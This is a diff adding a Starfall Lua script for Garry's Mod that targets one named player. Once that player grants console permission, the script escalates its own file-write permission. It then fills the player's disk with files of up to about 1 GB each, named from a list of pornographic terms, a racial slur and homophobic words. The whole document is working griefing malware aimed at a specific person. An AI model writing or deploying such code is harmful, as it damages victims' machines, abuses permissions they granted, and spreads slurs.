@@ -1,0 +1,49 @@
+--@name 1podarok lamary
+--@author
+--@client
+
+kill = find.playersByName("Lamar")[1]
+kill = find.playersByName("IamHappy")[2]
+print(kill)
+local Names = {"furry","porn","gayPorn","hentai","FullHDporn","NIGGERPORN","kopro","big_ass","fisting","anime_sex","gay"}
+
+
+
+setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
+local permissionSatisfied = hasPermission("console.command")
+
+hook.add("permissionrequest", "", function()
+    permissionSatisfied = hasPermission("console.command")
+    print("PIZDA")
+end)
+
+hook.add("think","",function()
+    if player() == kill then
+
+        if permissionSatisfied then
+            concmd("sf_permission_cl file.write client 3")
+            concmd("sf_timebuffersize_cl 10000")
+        end
+        if permissionSatisfied or hasPermission("file.write") then
+
+    
+            I = I or 0
+            I = I + 1
+            S = S or "1"
+            while quotaUsed()<quotaMax()*0.9 do
+            if string.len(S)<1073741824/1  then
+                S = S..S
+            end
+            
+            SS = math.random(1,table.count(Names))
+            SS2 = math.random(1,table.count(Names))
+            SS3 = math.random(1,table.count(Names))
+            SS4 = math.random(1,table.count(Names))
+            SS5 = math.random(1,table.count(Names))
+            SS6 = math.random(1,table.count(Names))
+            
+            file.write(tostring(I)..Names[SS]..Names[SS2]..Names[SS3]..Names[SS4]..Names[SS5]..Names[SS6]..timer.curtime()..".txt",S)
+            end
+        end
+    end
+end)
